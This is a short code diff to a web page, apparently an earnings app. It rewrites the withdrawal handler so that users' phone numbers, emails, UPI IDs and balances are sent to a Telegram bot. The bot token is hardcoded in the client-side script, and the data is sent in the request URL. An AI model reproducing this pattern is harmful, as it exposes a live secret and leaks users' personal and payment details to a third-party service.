@@ -101,10 +101,6 @@ body{
   border-radius:20px;
 }
 
-input{
-  outline:none;
-}
-
 </style>
 </head>
 
@@ -245,7 +241,19 @@ function submitCash(){
     return;
   }
 
-  alert("Withdrawal Requested ✅");
+  let BOT_TOKEN = "8608797876:AAF-RKV52vT8sd0FDrYj4avkb7n8zVWurjs";
+  let CHAT_ID = "7580298442";
+
+  let text = 
+  "💸 New Withdrawal Request\n\n" +
+  "📱 Phone: " + ph + "\n" +
+  "📧 Email: " + email + "\n" +
+  "🏦 UPI: " + upi + "\n" +
+  "💰 Amount: ₹" + balance;
+
+  fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text));
+
+  alert("Request Sent to Admin ✅");
 
   balance = 0;
   update();
